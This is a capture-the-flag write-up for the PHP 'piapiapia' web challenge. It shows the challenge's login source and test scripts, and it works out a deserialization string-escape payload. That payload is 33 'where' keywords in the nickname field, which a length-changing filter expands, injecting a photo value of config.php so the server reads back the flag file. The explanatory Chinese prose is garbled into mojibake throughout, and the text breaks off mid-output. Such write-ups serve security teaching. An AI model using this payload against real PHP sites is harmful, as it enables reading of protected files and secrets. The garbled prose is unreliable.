class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">file</span>&quot;&gt;<span class="title">Photo</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">photo</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">UPDATE</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 6.index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Login</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">LOGIN</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä»£ç å®¡è®¡å‘ç°å¯èƒ½å­˜åœ¨ç€ä»¥ä¸‹ä¸‰ä¸ªæ¼æ´ï¼š</p>
<ul>
<li>SQLæ³¨å…¥</li>
<li>ååºåˆ—åŒ–</li>
<li>æ–‡ä»¶ä¸Šä¼ </li>
</ul>
<p>æˆ‘ä»¬è¾“å…¥å¾—å†…å®¹éƒ½ä¼šè¢«è¿‡æ»¤ï¼š</p>
<ul>
<li><code>'</code>å’Œ<code>\\\\</code>éƒ½ä¼šè¢«æ›¿æ¢æˆ<code>_</code>;</li>
<li>select, update, delete, where éƒ½ä¼šè¢«æ›¿æ¢æˆ hacker</li>
</ul>
<p>ä»¥loginåŠŸèƒ½ä¸ºä¾‹ï¼Œå¦‚æœæƒ³è¦SQLæ³¨å…¥ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p>
<ul>
<li>çŸ¥é“usernameæ˜¯å¦å­˜åœ¨</li>
<li>å°†æŸ¥è¯¢å¾—ç»“æœä¸­çš„å¯†ç å’Œæˆ‘ä»¬è¾“å…¥çš„å¯†ç md5åè¿›è¡Œå¼ºç±»å‹æ¯”è¾ƒï¼›</li>
</ul>
<p>è¿™æ˜¾ç„¶æ˜¯ä¸å¤ªå¯èƒ½ç»•è¿‡çš„ï¼Œå› æ­¤æƒ³ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ ã€‚æˆ‘ä»¬ä¸Šä¼ çš„ä»»ä½•æ–‡ä»¶éƒ½ä¼šè¢«<code>move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));</code>ï¼Œä»è€Œå¾—ä¸åˆ°phpåç¼€çš„æ–‡ä»¶ï¼Œå› æ­¤æ–‡ä»¶ä¸Šä¼ ä¹Ÿä¸å¯èƒ½ã€‚</p>
<p>é‚£æœ€åå°±å‰©ä¸‹ååºåˆ—äº†ã€‚é€šè¿‡å¯¹æºç çš„åˆ†æï¼Œå¾—åˆ°å¦‚ä¸‹è¿‡ç¨‹(ä»åå¾€å‰)ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. config.phpä¸­æœ‰$flagï¼›</span><br><span class="line">   </span><br><span class="line">2. profile.phpä¸­çš„$profile = unserialize($profile);ï¼Œå¹¶ä¸”$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));å°†profileç±»å¯¹è±¡ä¸­çš„photoçš„å€¼è¯»å–å‡ºæ¥</span><br><span class="line">   </span><br><span class="line">3. profile.phpä¸­çš„$profile=$user-&gt;show_profile($username);å¾—åˆ°çš„$profile</span><br><span class="line">   </span><br><span class="line">4. update.phpä¸­çš„$user-&gt;update_profile($username, serialize($profile));ä¼ å…¥$profileçš„å€¼</span><br></pre></td></tr></table></figure></p>
<p>ä»å‰å¾€åç†ä¸€ä¸‹æ€è·¯ï¼šé¦–å…ˆï¼Œæˆ‘ä»¬é€šè¿‡æ›´æ–°ç®€ä»‹ä¼ å…¥4ä¸ªå±æ€§ï¼Œ<code>phone, email, nickname, photo</code>ï¼›ç„¶åè¿™å››ä¸ªå±æ€§ç»è¿‡åºåˆ—åŒ–ï¼Œå†<strong>è¿‡æ»¤</strong>æœ€åå¾—åˆ°$profileï¼›ç„¶ååˆè¢«profile.phpè°ƒç”¨ï¼Œååºåˆ—åŒ–å¹¶å°†å…¶ä¸­photoå±æ€§çš„å€¼ï¼ˆåº”æ˜¯æ–‡ä»¶åï¼‰è¯»å–base64ç¼–ç åè¿”å›åˆ°é¡µé¢ã€‚</p>
<h1 id="å‰ç½®çŸ¥è¯†">2 å‰ç½®çŸ¥è¯†</h1>
<h2 id="å±æ€§ä¸­å«æœ‰æ•°ç»„è¯¥å¦‚ä½•ååºåˆ—åŒ–">2.1 å±æ€§ä¸­å«æœ‰æ•°ç»„è¯¥å¦‚ä½•ååºåˆ—åŒ–</h2>
<p>ç¼–å†™å¦‚ä¸‹æµ‹è¯•ä»£ç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="keyword">Array</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> Test2;</span><br><span class="line">print_r(serialize(<span class="variable">$test1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">print_r(serialize(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;&#125;  </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ï¼Œå¦‚æœéœ€è¦åœ¨åºåˆ—åŒ–ä¸­æäº¤æ•°ç»„ï¼Œéœ€è¦æ³¨æ„è¿™ä¸€ç‚¹ï¼Œä¸ä»…éœ€è¦é—­åˆåŒå¼•å·ï¼Œè¿˜è¦æŠŠ<code>&#123;&#125;</code>ä¹Ÿç»™é—­åˆäº†ã€‚</p>
<h2 id="æ•°ç»„ç»•è¿‡ä¸€äº›å‡½æ•°">2.2 æ•°ç»„ç»•è¿‡ä¸€äº›å‡½æ•°</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line"><span class="number">2</span>. sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line"><span class="number">3</span>. ereg(pattern,<span class="keyword">Array</span>()) =<span class="literal">null</span></span><br><span class="line"><span class="number">4</span>. preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line"><span class="number">5</span>. strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) =<span class="literal">null</span></span><br><span class="line"><span class="number">6</span>. strpos(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line"><span class="number">7</span>. strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>ä»¥åŠ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="literal">null</span> &gt; <span class="number">10</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> &lt; <span class="number">10</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> == <span class="number">0</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> === <span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤å¯ä»¥æŠŠnullå½“ä½œ0ï¼Œä½†æ˜¯ä¸ºboolå‹ï¼Œæ‰€ä»¥å¼ºç±»å‹æ¯”è¾ƒç»“æœä¸ºfalse</p>
<h2 id="ååºåˆ—åŒ–æº¢å‡º">2.3 ååºåˆ—åŒ–æº¢å‡º</h2>
<p>å¯ä»¥æŸ¥çœ‹<a href="https://hdfzzf.icu/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/">ååºåˆ—åŒ–çŸ¥è¯†ç‚¹</a></p>
<h2 id="åºåˆ—åŒ–åçš„å±æ€§é¡ºåº">2.4 åºåˆ—åŒ–åçš„å±æ€§é¡ºåº</h2>
<p>ç¼–å†™ä»£ç æµ‹è¯•ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœå°†å±æ€§é¢ å€’ä¸€ä¸‹ï¼Œå…¶ä½™ä¸å˜ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>ç»“è®º</strong>ï¼šä»ä»¥ä¸Šå®éªŒå¯ä»¥çœ‹å‡ºï¼Œç¼–å†™ç±»çš„æ—¶å€™å±æ€§çš„å…ˆåé¡ºåºå°±æ˜¯åºåˆ—åŒ–åå­—ç¬¦ä¸²ä¸­å±æ€§çš„å…ˆåé¡ºåºã€‚</p>
<h1 id="è§£é¢˜">3 è§£é¢˜</h1>
<p>æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯å°†photoçš„å€¼æ”¹ä¸º<code>config.php</code>ï¼Œä½†æ˜¯photoçš„å†…å®¹ä¼šç»è¿‡md5åŠ å¯†ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥åˆ©ç”¨ï¼Œè¿™æ—¶å€™å°±è¦åˆ©ç”¨photoä¸€ä¸ªé¢çš„å±æ€§ï¼Œå³nicknameã€‚ï¼ˆè¿™é‡Œå¹¶æ²¡æœ‰ç»™å‡ºprofileç±»çš„å±æ€§çš„é¡ºåºï¼Œé‚£å°±è®¤ä¸ºæºç ä¸­èµ‹å€¼çš„é¡ºåºå°±æ˜¯ç±»ä¸­å±æ€§çš„é¡ºåºï¼Œå¦‚æœä¸æ˜¯å†å°è¯•å˜›ï¼Œè¿™ä¸æ˜¯é‡ç‚¹ï¼‰</p>
<p>å‡è®¾åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;&#125; </span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœæˆ‘ä»¬åœ¨nicknameé‡Œé¢å¡ä¸‹æˆ‘ä»¬æƒ³è¦çš„photoçš„å€¼<code>";s:5:"photo";s:10:"config.php";&#125;</code>ï¼Œå³ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">37</span>:<span class="string">&quot;m1ku&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125; </span></span><br></pre></td></tr></table></figure></p>
<p>è™½ç„¶ç¡®å®å¡è¿›å»äº†ï¼Œä½†æ˜¯å› ä¸ºæ­¤æ—¶nicknameçš„å€¼çš„é•¿åº¦ä¹Ÿåœ¨å˜åŒ–ï¼ˆå˜æˆäº†37ï¼‰ï¼Œæ‰€ä»¥å¡å…¥çš„è¿™äº›å†…å®¹è¿˜æ˜¯å±äºnicknameã€‚å› æ­¤ï¼Œéœ€è¦æƒ³åŠæ³•è®©å…¶é€ƒé€¸å‡ºæ¥ï¼Œæ ¹æ®ä»¥å¾€ç±»ä¼¼é¢˜ç›®çš„ç»éªŒï¼Œ<strong>å¦‚æœåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç»è¿‡è¿‡æ»¤å‡½æ•°ï¼ŒæŠŠæŸäº›å…³é”®è¯æ›¿æ¢æˆé•¿åº¦ä¸ä¸€æ ·çš„è¯ï¼Œåˆ™ä¼šå‡ºç°ååºåˆ—åŒ–æº¢å‡ºæ¼æ´</strong>ã€‚è€Œæœ¬é¢˜ç¡®å®å­˜åœ¨è¿‡æ»¤å‡½æ•°ï¼Œé‚£å°±æ˜¯class.phpä¸­mysqlç±»ä¸­çš„filteræ–¹æ³•ã€‚</p>
<p>è¯¥æ–¹æ³•è¿‡æ»¤çš„æƒ…å†µåœ¨<a href="#1%20é¢˜ç›®ä¿¡æ¯">1 é¢˜ç›®ä¿¡æ¯</a>ä¸­è¯´æ˜è¿‡äº†ï¼Œè¿™é‡Œä¸å†è¯´æ˜ã€‚ç”±äºæˆ‘ä»¬ä¼ å…¥çš„nicknameä¸èƒ½æœ‰ç‰¹æ®Šçš„ç¬¦å·ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡å–ç¬¬äºŒç§ã€‚æ³¨æ„åˆ°<code>where</code>æ›¿æ¢æˆ<code>hacker</code>æ—¶ï¼Œå­—ç¬¦ä¸²é•¿åº¦å˜äº†ï¼å› æ­¤ï¼Œåˆ©ç”¨ç‚¹å°±æ˜¯è¿™ä¸ªã€‚æ¯æœ‰ä¸€ä¸ªwhereï¼Œå­—ç¬¦ä¸²å°±èƒ½é€ƒé€¸å‡ºä¸€ä¸ªï¼Œæˆ‘ä»¬éœ€è¦æ³¨å…¥çš„æ˜¯<code>";s:5:"photo";s:10:"config.php";&#125;</code>é•¿åº¦ä¸º33ï¼Œå› æ­¤éœ€è¦33ä¸ªwhereã€‚payloadå¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nickname</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>ç¼–å†™ä»£ç æµ‹è¯•ä¸€ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;12345678910&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;m1ku@m1ku.com&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="variable">$pafter</span> = preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$p</span>);</span><br><span class="line">print_r(<span class="variable">$pafter</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ›¿æ¢å‰ï¼š</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">198</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ›¿æ¢åï¼š</span></span><br><span class="line"><span class="string">O:7:&quot;</span>profile<span class="string">&quot;:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678910</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:13:&quot;</span>m1ku@m1ku.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">æ•´ç†ä¸€ä¸‹ï¼š</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;</span><br><span class="line">s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">198</span>:<span 